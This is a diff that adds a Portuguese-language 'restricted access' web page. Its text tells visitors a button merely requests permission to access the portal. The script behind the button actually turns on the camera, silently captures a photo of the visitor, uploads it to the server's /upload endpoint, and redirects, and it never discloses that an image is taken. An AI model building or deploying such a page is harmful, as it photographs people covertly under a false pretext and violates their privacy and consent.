@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acesso Restrito</title>
+    <style>
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f5f5f5;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <h1>Acesso Restrito</h1>
+        <p>Para acessar o portal, por favor, clique no botão abaixo. Isso solicitará permissão para acessar o site.</p>
+        <button id="accessButton">Acessar Portal</button>
+    </div>
+
+    <script>
+        document.getElementById('accessButton').addEventListener('click', function() {
+            // Solicitar permissão para acessar a câmera
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    // Aguardar um segundo para garantir que a câmera esteja pronta
+                    setTimeout(() => {
+                        // Criar um canvas para capturar a imagem
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 320;
+                        canvas.height = 240;
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // Parar a câmera
+                        stream.getTracks().forEach(track => track.stop());
+
+                        // Converter a imagem para blob e fazer o upload
+                        canvas.toBlob(function(blob) {
+                            const file = new File([blob], "photo.png", { type: "image/png" });
+                            const formData = new FormData();
+                            formData.append('image', file);
+
+                            fetch('/upload', {
+                                method: 'POST',
+                                body: formData
+                            })
+                            .then(response => {
+                                if (!response.ok) {
+                                    throw new Error('Erro na resposta da rede');
+                                }
+                                return response.text();
+                            })
+                            .then(result => {
+                                console.log(result);
+                                // Redirecionar para a página principal após o upload
+                                window.location.href = '/main';
+                            })
+                            .catch(error => {
+                                console.error('Erro ao enviar a imagem:', error);
+                                alert('Erro ao enviar a imagem. Tente novamente.');
+                            });
+                        }, 'image/png');
+                    }, 1000);
+                })
+                .catch(function(error) {
+                    console.error('Permissão para acessar a câmera negada ou erro:', error);
+                    alert('Não foi possível acessar a câmera. Verifique as permissões do navegador.');
+                });
+        });
+    </script>
+</body>
+</html>
